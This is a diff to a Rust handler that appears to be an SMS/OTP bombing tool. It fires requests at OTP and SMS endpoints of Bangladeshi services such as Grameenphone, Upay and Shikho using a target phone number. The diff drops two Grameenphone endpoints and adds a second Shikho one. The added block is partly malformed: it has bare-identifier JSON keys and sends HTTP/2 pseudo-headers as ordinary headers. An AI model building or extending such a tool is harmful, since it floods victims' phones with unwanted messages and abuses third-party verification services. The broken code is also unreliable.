@@ -262,16 +262,6 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
             ]
         ),
 
-        // ── GP MyGP ──
-        fire("GP MyGP",
-            "https://appcity.grameenphone.com/proxy/v2/user/session/get-otp",
-            json!({"mobileNumber": number}),
-            &[
-                ("Content-Type", "application/json"),
-                ("channel", "web"),
-                ("User-Agent", "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36"),
-            ]
-        ),
 
         // ── Upay ──
         fire("Upay",
@@ -328,15 +318,6 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
             ]
         ),
 
-        // ── GP Shop ──
-        fire("GP Shop",
-            "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp",
-            json!({"phone": number, "language": "en", "email": ""}),
-            &[
-                ("Content-Type", "application/json"),
-                ("User-Agent", "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36"),
-            ]
-        ),
 
         // ── Shikho ──
         fire("Shikho",
@@ -349,6 +330,21 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
                 ("User-Agent", "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36"),
             ]
         ),
+
+
+    fire("Shikho 2",
+        "https://api.shikho.com/auth/v2/send/sms",
+  json!({phone: bd_full, type: "student", auth_type: "signup", vendor: "shikho"}),
+            &[
+("authority", "api.shikho.com"),
+("method", "POST"),
+("path", "/auth/v2/send/sms"),
+("scheme", "https"),
+("Accept", "application/json, text/plain, */*"),
+("Content-Type", "application/json"),
+("Origin", "https://shikho.com"),
+                    ]
+             ),
 
         // ── iEducation BD ──
         fire("iEducation BD",
